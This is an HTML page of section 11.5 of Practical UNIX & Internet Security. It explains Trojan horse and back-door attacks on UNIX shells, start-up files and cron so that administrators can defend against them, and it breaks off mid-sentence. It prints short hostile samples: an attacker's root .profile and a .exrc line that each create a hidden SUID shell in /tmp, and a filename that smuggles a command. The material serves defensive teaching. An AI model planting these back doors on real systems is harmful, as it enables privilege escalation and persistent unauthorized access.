<HTML><HEAD><TITLE>[Chapter 11] 11.5 Protecting Yourself</TITLE><METANAME="DC.title"CONTENT="Practical UNIX &amp; Internet Security"><METANAME="DC.creator"CONTENT="Simson Garfinkel &amp; Gene Spafford"><METANAME="DC.publisher"CONTENT="O'Reilly &amp; Associates, Inc."><METANAME="DC.date"CONTENT="1999-02-04T00:08:22Z"><METANAME="DC.type"CONTENT="Text.Monograph"><METANAME="DC.format"CONTENT="text/html"SCHEME="MIME"><METANAME="DC.source"CONTENT="1-56592-148-8"SCHEME="ISBN"><METANAME="DC.language"CONTENT="en-US"><METANAME="generator"CONTENT="Jade 1.1/O'Reilly DocBook 3.0 to HTML 4.0"><LINKREV="made"HREF="mailto:online-books@oreilly.com"TITLE="Online Books Comments"><LINKREL="up"HREF="ch11_01.htm"TITLE="11. Protecting Against Programmed Threats"><LINKREL="prev"HREF="ch11_04.htm"TITLE="11.4 Entry"><LINKREL="next"HREF="ch11_06.htm"TITLE="11.6 Protecting Your System"></HEAD><BODYBGCOLOR="#FFFFFF"TEXT="#000000"><DIVCLASS="htmlnav"><H1><IMGSRC="gifs/smbanner.gif"ALT="Practical UNIX &amp; Internet Security"USEMAP="#srchmap"BORDER="0"></H1><MAPNAME="srchmap"><AREASHAPE="RECT"COORDS="0,0,466,65"HREF="index.htm"ALT="Practical UNIX &amp; Internet Security"><AREASHAPE="RECT"COORDS="467,0,514,18"HREF="../search/psrch.htm"ALT="Search this book"></MAP><TABLEWIDTH="515"BORDER="0"CELLSPACING="0"CELLPADDING="0"><TR><TDALIGN="LEFT"VALIGN="TOP"WIDTH="172"><ACLASS="SECT1"HREF="ch11_04.htm"TITLE="11.4 Entry"><IMGSRC="../gifs/txtpreva.gif"ALT="Previous: 11.4 Entry"BORDER="0"></A></TD><TDALIGN="CENTER"VALIGN="TOP"WIDTH="171"><B><FONTFACE="ARIEL,HELVETICA,HELV,SANSERIF"SIZE="-1">Chapter 11<BR>Protecting Against Programmed Threats</FONT></B></TD><TDALIGN="RIGHT"VALIGN="TOP"WIDTH="172"><ACLASS="SECT1"HREF="ch11_06.htm"TITLE="11.6 Protecting Your System"><IMGSRC="../gifs/txtnexta.gif"ALT="Next: 11.6 Protecting Your System"BORDER="0"></A></TD></TR></TABLE>&nbsp;<HRALIGN="LEFT"WIDTH="515"TITLE="footer"></DIV><DIVCLASS="SECT1"><H2CLASS="sect1"><ACLASS="title"NAME="PUIS-CHP-11-SECT-5">11.5 Protecting Yourself</A></H2><PCLASS="para"><ACLASS="indexterm"NAME="AUTOID-15131"></A><ACLASS="indexterm"NAME="AUTOID-15133"></A><ACLASS="indexterm"NAME="AUTOID-15136"></A>The types ofprogrammed threats you are most likely to encounter in the <SPANCLASS="acronym">UNIX</SPAN>environment are Trojan horses and back doors. In part, this is becausewriting effective worms and viruses is difficult; also, attackersdo not intend outright damage to your system. Instead, they useTrojan horses or back doors to gain (or regain) additional accessto your system. If damage is a goal, obtaining superuser accessis usually a first step in the process.</P><PCLASS="para"><ACLASS="indexterm"NAME="AUTOID-15140"></A>Some of the features that give<SPANCLASS="acronym">UNIX</SPAN> flexibility and power also enable attackersto craft workable Trojan horse or back door schemes.</P><PCLASS="para">Ingeneral, attacks come in one of the following forms:</P><ULCLASS="itemizedlist"><LICLASS="listitem"><PCLASS="para">Altering the expected behavior ofthe shell (command interpreter)</P></LI><LICLASS="listitem"><PCLASS="para">Abusing some form of start-up mechanism</P></LI><LICLASS="listitem"><PCLASS="para">Subverting some form of automatic mechanism</P></LI><LICLASS="listitem"><PCLASS="para">Exploiting unexpected interactions</P></LI></UL><PCLASS="para">All of these plans are designed basically to get a privilegeduser or account to execute commands that would not normally be executed.For example, one very common Trojan horse is a program named suthat, instead of making you the superuser, sends a copy of the superuserpassword to an account at another computer.</P><PCLASS="para">To protectyour system effectively, you need to know how these attacks work.By understanding the methods of attack, you can then be aware ofhow to prevent them.</P><PCLASS="para">An equally important part of protectingyourself is to run a secure system in general. Normal computer securityprocedures will protect your system against both programmed threatsand malicious users.</P><DIVCLASS="sect2"><H3CLASS="sect2"><ACLASS="title"NAME="PUIS-CHP-11-SECT-5.1">11.5.1 Shell Features</A></H3><PCLASS="para">The shells <ACLASS="indexterm"NAME="AUTOID-15160"></A><ACLASS="indexterm"NAME="AUTOID-15163"></A><ACLASS="indexterm"NAME="AUTOID-15166"></A><ACLASS="indexterm"NAME="AUTOID-15169"></A><ACLASS="indexterm"NAME="AUTOID-15172"></A><KBDCLASS="command">(csh,sh, ksh, tcsh,</KBD> and others) provide users with a number of shortcutsand conveniences. Among these features is a complete programminglanguage with variables. Some of these variables govern the behaviorof the shell itself. If an attacker is able to subvert the way theshell of a privileged user works, the attacker can often get theuser (or a background task) to execute a task for him.</P><PCLASS="para">Thereare a variety of common attacks using features of the shell to compromisesecurity. These are described in the following sections.</P><DIVCLASS="sect3"><H4CLASS="sect3"><ACLASS="title"NAME="PUIS-CHP-11-SECT-5.1.1">11.5.1.1 PATH attacks</A></H4><PCLASS="para"><ACLASS="indexterm"NAME="AUTOID-15179"></A><ACLASS="indexterm"NAME="AUTOID-15182"></A>Each shell maintainsa path, consisting of a set of directories to be searched for commandsissued by the user. This set of directories is consulted, one ata time, when the user types a command whose name does not containa / symbol, and which does not bind to an internal shellcommand name or alias.</P><PCLASS="para">In the <ACLASS="indexterm"NAME="AUTOID-15186"></A>Bourne and Korn shells, the <SPANCLASS="acronym">PATH</SPAN>variable is normally set within the initialization file. The listof directories given normally consists of directories, separatedby a colon (:). An entry of only a period, or an empty entry,[4]means to search the current directory. The <KBDCLASS="command">csh</KBD> path is initializedby setting the variable <SPANCLASS="acronym">PATH</SPAN> with a list of space-separateddirectory names enclosed in parentheses.</P><BLOCKQUOTECLASS="footnote"><PCLASS="para">[4] In a POSIX system, a null entry does not translate to thecurrent directory; an explicit dot must be used.</P></BLOCKQUOTE><PCLASS="para">For instance,the following are typical initializations that have vulnerabilities:</P><BLOCKQUOTECLASS="screen"><PRECLASS="screen">PATH=.:/usr/bin:/bin:/usr/local/bin &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<KBDCLASS="command">sh</KBD> or <KBDCLASS="command">ksh</KBD>set path = ( . /usr/bin /bin /usr/local/bin) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<KBDCLASS="command">csh</KBD></PRE></BLOCKQUOTE><PCLASS="para">In the above, each command sets the search path to look firstin the current directory, then in <ACLASS="indexterm"NAME="AUTOID-15200"></A><ACLASS="indexterm"NAME="AUTOID-15203"></A><ACLASS="indexterm"NAME="AUTOID-15206"></A><ICLASS="filename">/usr/bin,</I> then in <ICLASS="filename">/bin,</I>and then in <ICLASS="filename">/usr/local/bin.</I> This is apoor choice of settings, especially if the user has special privileges.The current directory, as designated by a null directory or period,should never be included in the search path. To illustrate the dangerof placing the current directory in your path, see the example givenin &quot;Stealing Superuser&quot; in <ACLASS="xref"HREF="ch04_01.htm"TITLE="Users, Groups, and the Superuser">Chapter 4, <CITECLASS="chapter">Users, Groups, and the Superuser</CITE></A>.</P><PCLASS="para">Youshould also avoid this sort of initialization, which also placesthe current directory in your search path:</P><PCLASS="para">Incorrect:</P><BLOCKQUOTECLASS="screen"><PRECLASS="screen">PATH=:/usr/bin:/bin:/usr/local/bin:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sh or ksh</PRE></BLOCKQUOTE><PCLASS="para">Correct:</P><BLOCKQUOTECLASS="screen"><PRECLASS="screen">PATH= /usr/bin:/bin:/usr/local/bin &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sh or ksh</PRE></BLOCKQUOTE><PCLASS="para">The colons (:) should <EMCLASS="emphasis">only</EM>be used as delimiters, not as end caps.</P><PCLASS="para">No sensitiveaccount should ever have the current directory in its search path.[5] This rule is especially trueof the superuser account! More generally, you should never havea directory in your search path that is writable by other users.Some sites keep a special directory, such as <ICLASS="filename">/usr/local/bin/</I>,world-writable (mode 777) so that users can install programs forthe benefit of others. Unfortunately, this practice opens up theentire system to the sort of attacks outlined earlier.</P><BLOCKQUOTECLASS="footnote"><PCLASS="para">[5] We would argue that no account should have the current directoryin its search path, but we understand how difficult this practicewould be to enforce.</P></BLOCKQUOTE><PCLASS="para">Puttingthe current directory last in the search path is also not a goodidea. For instance, if you use the <KBDCLASS="command">more</KBD> command frequently, butsometimes type <KBDCLASS="command">mroe</KBD>, the attacker can take advantage of this byplacing a Trojan horse named <KBDCLASS="command">mroe</KBD> in this directory. It may be manyweeks or months before the command is accidentally executed. However,when the command is executed, your security will be penetrated.</P><PCLASS="para">We strongly recommend that you get into the habit of typingthe full pathname of commands when you are running as <ICLASS="filename">root</I>. Forexample, instead of only typing <KBDCLASS="command">chown</KBD>, type <ICLASS="filename">/etc/chown</I>to be sure you are getting the system version! This may seem likeextra work, but when you are running as <ICLASS="filename">root</I>, you also bear extraresponsibility.</P><PCLASS="para">If you create any shell files thatwill be run by a privileged user&nbsp;- including <ICLASS="filename">root</I>, <KBDCLASS="command">uucp</KBD>,<KBDCLASS="command">bin</KBD>, etc.&nbsp;- get in the habit of resetting the <ICLASS="filename">PATH</I>variable as one of the first things you do in each shell file. The<ICLASS="filename">PATH</I> should include only sensible, protecteddirectories. This method is discussed further in <ACLASS="xref"HREF="ch23_01.htm"TITLE="Writing Secure SUID and Network Programs">Chapter 23, <CITECLASS="chapter">Writing Secure SUID and Network Programs</CITE></A>.</P></DIV><DIVCLASS="sect3"><H4CLASS="sect3"><ACLASS="title"NAME="PUIS-CHP-11-SECT-5.1.2">11.5.1.2 IFS attacks</A></H4><PCLASS="para"><ACLASS="indexterm"NAME="AUTOID-15242"></A><ACLASS="indexterm"NAME="AUTOID-15245"></A>The <SPANCLASS="acronym">IFS</SPAN>variable can be set to indicate what characters separate input words(similar to the <KBDCLASS="command">-F</KBD> option to awk). The benefit of thisvariable is that you can use it to change the behavior of the shellin interesting ways. For example, you could use the following shellscript to get a list of account names and their home directories:</P><BLOCKQUOTECLASS="screen"><PRECLASS="screen">#!/bin/shIFS=&quot;:&quot;while read acct passwd uid gid gcos homedir shelldo&nbsp;&nbsp;&nbsp;echo $acct &quot; &quot; $homedirdone &lt; /etc/passwd&#13;</PRE></BLOCKQUOTE><PCLASS="para">(Inthe example shown earlier, the shell has already read and parsedthe whole file before the assignment to <SPANCLASS="acronym">IFS</SPAN> isexecuted, so the remaining words are not separated with colon (:)characters.)</P><PCLASS="para"><ACLASS="indexterm"NAME="AUTOID-15254"></A><ACLASS="indexterm"NAME="AUTOID-15256"></A><ACLASS="indexterm"NAME="AUTOID-15258"></A><ACLASS="indexterm"NAME="AUTOID-15261"></A>The<SPANCLASS="acronym">IFS</SPAN> feature has largely been superseded by othertools, such as awk and Perl. However, the feature lives on and cancause unexpected damage. By setting <SPANCLASS="acronym">IFS</SPAN> to use/ as a separator, an attacker could cause a shell fileor program to execute unexpected commands, as described in <ACLASS="xref"HREF="ch05_05.htm#PUIS-CHP-5-SECT-5.3.2"TITLE="Another SUID example: IFS and the /usr/lib/preserve hole">Section 5.5.3.2, "Another SUID example: IFS and the /usr/lib/preservehole"</A>.</P><PCLASS="para">Most modern versions ofthe shell will reset their <SPANCLASS="acronym">IFS</SPAN> value to a normalset of characters when invoked. Thus, shell files will behave properly.However, not all do. To determine if your shell is immune to thisproblem, try executing the following:</P><BLOCKQUOTECLASS="screen"><PRECLASS="screen">: A test of the shellcd /tmpcat &gt; tmp &lt;&lt;'E-O-F'echo &quot;Danger!&quot;echo &quot;Your shell does NOT reset the IFS variable!&quot;E-O-Fcat &gt; foo &lt;&lt;&quot;E-O-F&quot;echo &quot;Your shell appears well behaved.&quot;E-O-Fcat &gt; test$$ &lt;&lt;&quot;E-O-F&quot;/tmp/fooE-O-Fchmod 700 tmp foo test$$PATH=.:$PATHIFS=&quot;/$IFS&quot;export PATH IFStest$$rm -f tmp foo test$$&#13;</PRE></BLOCKQUOTE><PCLASS="para">Failure to reset the <SPANCLASS="acronym">IFS</SPAN> variable is notitself a security problem. The difficulty arises when a shell fileis executed on behalf of a user, or if some command is executedfrom within a program using the system() orpopen() calls (they both use the shell to parseand execute their arguments). If an attacker can execute the programas a privileged user and reset the search path, then he can compromisesecurity. You should be especially cautious about writing shellfiles and <SPANCLASS="acronym">SUID/SGID</SPAN> programs if your shell doesnot reset <SPANCLASS="acronym">IFS</SPAN>.</P></DIV><DIVCLASS="sect3"><H4CLASS="sect3"><ACLASS="title"NAME="PUIS-CHP-11-SECT-5.1.3">11.5.1.3 $HOME attacks</A></H4><PCLASS="para"><ACLASS="indexterm"NAME="AUTOID-15277"></A><ACLASS="indexterm"NAME="AUTOID-15279"></A><ACLASS="indexterm"NAME="AUTOID-15282"></A><ACLASS="indexterm"NAME="AUTOID-15285"></A>Yet another tactic that can be exploited,in some circumstances, is to reset the <SPANCLASS="acronym">HOME</SPAN> variable.Normally, the csh and ksh substitute the value of this variablefor the ~ symbol when it is used in pathnames. Thus, if an attackeris able to change the value of this variable, he might also be ableto take advantage of a shell file that used the ~ symbol as a shorthandfor the home directory.</P><PCLASS="para">For example, if there is a<SPANCLASS="acronym">SUID</SPAN> csh file (despite our warnings about bothcsh and <SPANCLASS="acronym">SUID</SPAN> shell files) that references <ICLASS="filename">~/.rhosts</I>for the user, an attacker could subvert it by resetting the <SPANCLASS="acronym">HOME</SPAN>environment variable before running it.</P></DIV><DIVCLASS="sect3"><H4CLASS="sect3"><ACLASS="title"NAME="PUIS-CHP-11-SECT-5.1.4">11.5.1.4 Filename attacks</A></H4><PCLASS="para"><ACLASS="indexterm"NAME="AUTOID-15297"></A><ACLASS="indexterm"NAME="AUTOID-15299"></A>One subtle formof attack results from an interaction between the shell and thefilesystem. The <SPANCLASS="acronym">UNIX</SPAN> filesystem has no stipulationson the characters that can be used in a filename, other than thatthe slash (/) and null (<SPANCLASS="acronym">ASCII</SPAN> 0) charactercannot be used. Consequently, other special characters can be used,including the following:</P><PCLASS="para">` ; | &amp;$</P><PCLASS="para">The problem exists when a user finds thatsome script or command is executed on a regular basis by a privilegeduser, and the command uses filenames as an argument. If your attackershould create a filename with the appropriate sequence of characters,the attacker could execute a command of his or her choosing.</P><PCLASS="para">This problem most often manifests itself when there are scriptsrun from the <ACLASS="indexterm"NAME="AUTOID-15307"></A><ACLASS="indexterm"NAME="AUTOID-15309"></A><ACLASS="indexterm"NAME="AUTOID-15311"></A>cronfile to do filesystem sweeps or accounting. The commands most susceptibleto this form of attack are <KBDCLASS="command">find</KBD> and <KBDCLASS="command">xargs</KBD>,[6]along with anythingthat edits input and moves it to a shell. The following script demonstratesall three and checks the versions of your programs to see if theycan be used in such an attack. If so, examine carefully any scriptsyou run regularly.</P><BLOCKQUOTECLASS="footnote"><PCLASS="para">[6] The GNU <KBDCLASS="command">find</KBD> and<KBDCLASS="command">xargs</KBD> programs have a <KBDCLASS="command">-0</KBD> option which causes the programs to usethe NULL character as the delimiter rather than the linefeed. Theuse of this option protects these commands from filename attacksof the variety described in this section.</P></BLOCKQUOTE><DIVCLASS="example"><H4CLASS="example"><ACLASS="title"NAME="PUIS-CHP-11-EX-1">Example 11.1: Command Test Script</A></H4><BLOCKQUOTECLASS="screen"><PRECLASS="screen">: A Test of three basic commandscd /tmpif test -f ./gotchathen&nbsp;&nbsp;&nbsp;echo &quot;Ooops! There is already a file named gotcha here.&quot;&nbsp;&nbsp;&nbsp;echo &quot;Delete it and try again.&quot;&nbsp;&nbsp;&nbsp;exit 1ficat &gt; gotcha &lt;&lt;E-O-Fecho &quot;Haha! Gotcha! If this was nasty, you would have a problem! 1&gt;&amp;2&quot;touch g$$exit 2E-O-Fchmod +x ./gotchafname='foo;`gotcha`'touch &quot;$fname&quot;PATH=.:$PATHexport PATHfind /tmp -type f -exec echo {} \; &gt; /dev/nullif test -f ./g$$then&nbsp;&nbsp;&nbsp;echo &quot;Ooops! find gotcha!&quot;&nbsp;&nbsp;&nbsp;rm -f g$$else&nbsp;&nbsp;&nbsp;echo &quot;find okay&quot;fils -1 * | sed 's/^/wc /' | sh &gt;/dev/nullif test -f ./g$$then&nbsp;&nbsp;&nbsp;echo &quot;Ooops! your shell gotcha!&quot;&nbsp;&nbsp;&nbsp;rm -f g$$else&nbsp;&nbsp;&nbsp;echo &quot;your shell okay&quot;fils -1 | xargs ls &gt;/dev/nullif test -f ./g$$then&nbsp;&nbsp;&nbsp;echo &quot;Ooops! xargs gotcha!&quot;&nbsp;&nbsp;&nbsp;rm -f g$$elseecho &quot;xargs okay&quot;firm -f ./gotcha &quot;$fname&quot; g$$ <ACLASS="indexterm"NAME="AUTOID-15323"></A> </PRE></BLOCKQUOTE></DIV></DIV></DIV><DIVCLASS="sect2"><H3CLASS="sect2"><ACLASS="title"NAME="PUIS-CHP-11-SECT-5.2">11.5.2 Start-up File Attacks</A></H3><PCLASS="para"><ACLASS="indexterm"NAME="AUTOID-15328"></A><ACLASS="indexterm"NAME="AUTOID-15331"></A><ACLASS="indexterm"NAME="AUTOID-15334"></A><ACLASS="indexterm"NAME="AUTOID-15337"></A>Various programs have methodsof automatic initialization to set options and variables for theuser. Once set, the user normally never looks at these again. Asa result, they are a great spot for an attacker to make a hiddenchange to be executed automatically on her behalf.</P><PCLASS="para">Theproblem is not that these start-up files exist, but that an attackermay be able to write to them. All start-up files should be protectedso only the file's owner can write to them. Even havinggroup-write permission on these files may be dangerous.</P><DIVCLASS="sect3"><H4CLASS="sect3"><ACLASS="title"NAME="PUIS-CHP-11-SECT-5.2.1">11.5.2.1 .login, .profile, /etc/profile</A></H4><PCLASS="para"><ACLASS="indexterm"NAME="AUTOID-15344"></A><ACLASS="indexterm"NAME="AUTOID-15346"></A><ACLASS="indexterm"NAME="AUTOID-15348"></A>Thesefiles are executed when the user first logs in. Commands withinthe files are executed by the user's shell. Allowing anattacker to write to these files can result in arbitrary commandsbeing executed each time the user logs in, or on a one-time basis(and hidden):</P><BLOCKQUOTECLASS="screen"><PRECLASS="screen">: attacker's version of root's .profile file/bin/cp /bin/sh /tmp/.secret/etc/chown root /tmp/.secret/bin/chmod 4555 /tmp/.secret: run real .profile and replace this filemv /.real_profile /.profile. /.profile</PRE></BLOCKQUOTE></DIV><DIVCLASS="sect3"><H4CLASS="sect3"><ACLASS="title"NAME="PUIS-CHP-11-SECT-5.2.2">11.5.2.2 .cshrc, .kshrc</A></H4><PCLASS="para"><ACLASS="indexterm"NAME="AUTOID-15355"></A><ACLASS="indexterm"NAME="AUTOID-15357"></A>These are files that canbe executed at login or when a new shell is run. They may also berun after executing <KBDCLASS="command">su</KBD> to the user account.</P></DIV><DIVCLASS="sect3"><H4CLASS="sect3"><ACLASS="title"NAME="PUIS-CHP-11-SECT-5.2.3">11.5.2.3 GNU .emacs</A></H4><PCLASS="para"><ACLASS="indexterm"NAME="AUTOID-15363"></A><ACLASS="indexterm"NAME="AUTOID-15365"></A><ACLASS="indexterm"NAME="AUTOID-15367"></A>This file is read and executedwhen the <SPANCLASS="acronym">GNU</SPAN> Emacs editor is started. Commandsof arbitrary nature may be written in Emacs <SPANCLASS="acronym">LISP</SPAN>code and buried within the user's Emacs start-up commands.Furthermore, if any of the directories listed in the load-path variableare writable, the library modules can be modified with similar results.</P></DIV><DIVCLASS="sect3"><H4CLASS="sect3"><ACLASS="title"NAME="PUIS-CHP-11-SECT-5.2.4">11.5.2.4 .exrc</A></H4><PCLASS="para"><ACLASS="indexterm"NAME="AUTOID-15375"></A><ACLASS="indexterm"NAME="AUTOID-15377"></A><ACLASS="indexterm"NAME="AUTOID-15379"></A><ACLASS="indexterm"NAME="AUTOID-15381"></A><ACLASS="indexterm"NAME="AUTOID-15384"></A><ACLASS="indexterm"NAME="AUTOID-15387"></A>Thisfile is read for initialization when the ex or vi editor is started.What is particularly nasty is that if there is a version of thisfile present in the current directory, then its contents may beread in and used in preference to the one in the user'shome directory.</P><PCLASS="para">Thus, an attacker might do the followingin every directory where he has write access:</P><BLOCKQUOTECLASS="screen"><PRECLASS="screen">% cat &gt; .exrc!(cp /bin/sh /tmp/.secret;chmod 4755 /tmp/.secret)&amp;^D</PRE></BLOCKQUOTE><PCLASS="para">Should the superuser ever start either the <KBDCLASS="command">vi</KBD> or <KBDCLASS="command">ex</KBD> editorin one of those directories, the superuser will unintentionallycreate an <SPANCLASS="acronym">SUID</SPAN> <KBDCLASS="command">sh</KBD>. The superuser will noticea momentary display of the ! symbol during editor start-up. Theattacker can then, at a later point, recover this <SPANCLASS="acronym">SUID</SPAN>file and take full advantage of the system.</P><PCLASS="para">Some versionsof the <KBDCLASS="command">vi/ex</KBD> software allow you to put the command <KBDCLASS="command">set noexrc</KBD> in your EXINIT environment variable. This ability preventsany local <ICLASS="filename">.exrc</I> file from being read and executed.</P></DIV><DIVCLASS="sect3"><H4CLASS="sect3"><ACLASS="title"NAME="PUIS-CHP-11-SECT-5.2.5">11.5.2.5 .forward, .procmailrc</A></H4><PCLASS="para"><ACLASS="indexterm"NAME="AUTOID-15405"></A><ACLASS="indexterm"NAME="AUTOID-15407"></A><ACLASS="indexterm"NAME="AUTOID-15409"></A><ACLASS="indexterm"NAME="AUTOID-15411"></A>Some mailers allow the user to specify specialhandling of mail by placing special files in their home directory.With <KBDCLASS="command">sendmail</KBD>, the user may specify certain addresses and programsin the <ICLASS="filename">.forward</I> file. If an attacker can write to this file, shecan specify that upon mail receipt a certain program be run&nbsp;- likea shell script in /tmp that creates a <SPANCLASS="acronym">SUID</SPAN>shell for the attacker.</P><PCLASS="para">Many popular mailer packagesallow users to write <ICLASS="firstterm"><ACLASS="indexterm"NAME="AUTOID-15419"></A><ACLASS="indexterm"NAME="AUTOID-15421"></A><ACLASS="indexterm"NAME="AUTOID-15423"></A><ACLASS="indexterm"NAME="AUTOID-15425"></A>filter files</I>to process their mail in a semi-automated fashion. This includesthe <KBDCLASS="command">procmail</KBD> system, <KBDCLASS="command">MH</KBD>, <KBDCLASS="command">elm</KBD>,and several others. Some of these programs are quite powerful, andhave the potential to cause problems on your system. If a user writesa filter to trigger on a particular form of mail coming into themailbox, an attacker could craft a message to cause unwarrantedbehavior.</P><PCLASS="para">For example, suppose that one of your usershas installed an autoreply to send an &quot;out-of-the-office&quot;reply to any incoming mail. If someone with malicious intent wereto send a forged mail message with a bad return address, the haplessuser's mailer would send an automated reply. However, thebad address would cause a bounce message to come back, only to triggeranother autoreply. The result is an endless exchange of autorepliesand error messages, tying up network bandwidth (if non-local), logfile space, and disk space for the user. (The solution is to usean autoreply that either sends a reply to each address only onceevery few days, and that recognizes error messages. Unfortunately,novice users, by definition, seldom think about how what they writecan go wrong.)</P></DIV><DIVCLASS="sect3"><H4CLASS="sect3"><ACLASS="title"NAME="PUIS-CHP-11-SECT-5.2.6">11.5.2.6 Other files</A></H4><PCLASS="para">Other programs also haveinitialization files that can be abused. Third-party systems thatyou install on your system, such as database systems, office interfaces,and windowing systems, all may have initialization files that cancause problems if they are configured incorrectly or are writable.You should carefully examine any initialization files present onyour system, and especially check their permissions.</P></DIV><DIVCLASS="sect3"><H4CLASS="sect3"><ACLASS="title"NAME="PUIS-CHP-11-SECT-5.2.7">11.5.2.7 Other initializations</A></H4><PCLASS="para"><ACLASS="indexterm"NAME="AUTOID-15437"></A><ACLASS="indexterm"NAME="AUTOID-15439"></A>Many programsallow you to set initialization values in environment variablesin your shell rather than in your files. These can also cause difficultiesif they are manipulated maliciously. For instance, in the aboveexample for <KBDCLASS="command">vi</KBD>, the Trojan horse can be planted in the EXINIT environmentvariable rather than in a file. The attacker then needs to trickthe superuser into somehow sourcing a file or executing a shellfile that sets the environment variable and then executes the editor.Be very wary of any circumstances where you might alter one of yourshell variables in this way!</P><PCLASS="para"><ACLASS="indexterm"NAME="AUTOID-15444"></A><ACLASS="indexterm"NAME="AUTOID-15446"></A><ACLASS="indexterm"NAME="AUTOID-15448"></A><ACLASS="indexterm"NAME="AUTOID-15450"></A><ACLASS="indexterm"NAME="AUTOID-15452"></A><ACLASS="indexterm"NAME="AUTOID-15455"></A><ACLASS="indexterm"NAME="AUTOID-15458"></A><ACLASS="indexterm"NAME="AUTOID-15461"></A>Another possible source of initializationerrors comes into play when you edit files that have embedded editcommands. Both <KBDCLASS="command">vi/ex</KBD> and Emacs allow you to embed editorcommands within text files so they are automatically executed wheneveryou edit the file. For this to work, they must be located in thefirst few or last few lines of the file.</P><PCLASS="para">To disablethis feature in Emacs, place one of these lines in your .emacs file:</P><BLOCKQUOTECLASS="screen"><PRECLASS="screen">(setq inhibit-local-variables t)										; emacs version 18</PRE></BLOCKQUOTE><PCLASS="para">or:</P><BLOCKQUOTECLASS="screen"><PRECLASS="screen">(setq enable-local-variables &quot;ask&quot;)										; emacs verison 19 and above</PRE></BLOCKQUOTE><PCLASS="para">We know of no uniformmethod of disabling the undesired behavior of vi/ex onevery platform without making alterations to the source. Some vendorsmay have provided a means of shutting off this automatic initialization,so check your documentation.<ACLASS="indexterm"NAME="AUTOID-15470"></A><ACLASS="indexterm"NAME="AUTOID-15473"></A><ACLASS="indexterm"NAME="AUTOID-15476"></A><ACLASS="indexterm"NAME="AUTOID-15479"></A></P></DIV></DIV><DIVCLASS="sect2"><H3CLASS="sect2"><ACLASS="title"NAME="PUIS-CHP-11-SECT-5.3">11.5.3 Abusing Automatic Mechanisms</A></H3><PCLASS="para"><SPANCLASS="acronym">UNIX</SPAN><ACLASS="indexterm"NAME="AUTOID-15486"></A><ACLASS="indexterm"NAME="AUTOID-15489"></A>has programsand systems that run automatically. Many of these systems requirespecial privileges. If an attacker can compromise these systems,he may be able to gain direct unauthorized access to other partsof the operating system, or to plant a back door to gain accessat a later time.</P><PCLASS="para">In general, there are three principlesto preventing abuse of these automatic systems:</P><OLCLASS="orderedlist"><LICLASS="listitem"><PCLASS="para">Don't run anything in thebackground or periodically with any more privileges than absolutelynecessary.</P></LI><LICLASS="listitem"><PCLASS="para">Don't have <ACLASS="indexterm"NAME="AUTOID-15498"></A>configurationfiles for these systems writable by anyone other than the superuser.Consider making them unreadable, too.</P></LI><LICLASS="listitem"><PCLASS="para">When adding anything new to the system that willbe run automatically, keep it simple and test it as thoroughly asyou can.</P></LI></OL><PCLASS="para">The first principlesuggests that if you can run something in the background with auser ID other than root, you should do so. For instance, the <ACLASS="indexterm"NAME="AUTOID-15504"></A><ACLASS="indexterm"NAME="AUTOID-15507"></A>uucp andUsenet cleanup scripts that are usually executed on a nightly basisshould be run from the uucp and news <SPANCLASS="acronym">UID</SPAN>s, ratherthan as the superuser. Those shell files and their directories shouldall be protected so that they are unwritable by other users. Inthis way, an attacker can't modify the files and insertcommands that will be automatically executed at a later time.</P><DIVCLASS="sect3"><H4CLASS="sect3"><ACLASS="title"NAME="PUIS-CHP-11-SECT-5.3.1">11.5.3.1 crontab entries</A></H4><PCLASS="para"><ACLASS="indexterm"NAME="AUTOID-15514"></A>Thereare three forms of <ICLASS="filename">crontab</I> files. The oldest form has a line witha command to be executed as superuser whenever the time field ismatched by the <KBDCLASS="command">cron</KBD> daemon.[7]To execute commands from this old-style <ICLASS="filename">crontab</I> file as a user otherthan root, it is necessary to make the command listed in the <ICLASS="filename">crontab</I>file use the <KBDCLASS="command">su</KBD> command. For example:</P><BLOCKQUOTECLASS="footnote"><PCLASS="para">[7] All crontab files arestructured with five fields (minutes, hours, days, months, day ofweek) indicating the time at which to run the command.</P></BLOCKQUOTE><BLOCKQUOTECLASS="screen"><PRECLASS="screen">59 1 * * *				su news -c /usr/lib/news/news.daily</PRE></BLOCKQUOTE><PCLASS="para">This has the effect of running the <KBDCLASS="command">su</KBD> command at 1:59 a.m.,resulting in a shell running as user news. The shell is given argumentsof both <KBDCLASS="command">-c</KBD> and <ICLASS="filename">/usr/lib/news/news.daily</I>that then cause the script to be run as a command.</P><PCLASS="para">Thesecond form of the <ICLASS="filename">cron</I> file has an extra fieldthat indicates on whose behalf the command is being run. Below,the script is run at 1:59 a.m. as user news without the need fora <KBDCLASS="command">su</KBD> command. This version of <ICLASS="filename">cron </I>is foundprincipally in versions of <SPANCLASS="acronym">UNIX</SPAN> derived fromthe older <SPANCLASS="acronym">BSD</SPAN> version:</P><BLOCKQUOTECLASS="screen"><PRECLASS="screen">59 1 * * *				news			/usr/lib/news/news.daily</PRE></BLOCKQUOTE><PCLASS="para">The third form of <KBDCLASS="command">cron</KBD> is found in System V systems, and laterversions of <SPANCLASS="acronym">BSD</SPAN>-derived <SPANCLASS="acronym">UNIX</SPAN>.It keeps a protected directory with a separate <ICLASS="filename">crontab</I> file foreach user. The <KBDCLASS="command">cron</KBD> daemon examines all the files and dispatchesjobs based on the user owning the file. This form of <KBDCLASS="command">cron</KBD> does notneed any special care in the entries, although (like the other twoversions) the files and directories need to be kept protected.</P><PCLASS="para">A freely redistributable version of <KBDCLASS="command">cron</KBD> that has this thirdtype of behavior is available on many <SPANCLASS="acronym">FTP</SPAN> sites(be sure to get the latest version). It was written by Paul Vixieand is available for anyone who wants to use it for noncommercialpurposes. If you are stuck with the oldest form of <KBDCLASS="command">cron</KBD>, we suggestthat you consider obtaining Paul's version to replace yours.</P></DIV><DIVCLASS="sect3"><H4CLASS="sect3"><ACLASS="title"NAME="PUIS-CHP-11-SECT-5.3.2">11.5.3.2 inetd.conf</A></H4><PCLASS="para"><ACLASS="indexterm"NAME="AUTOID-15549"></A>The<ICLASS="filename">/etc/inetd.conf</I> file defines what programs shouldbe run when incoming network connections are caught by the <KBDCLASS="command">inetd</KBD>daemon. An intruder who 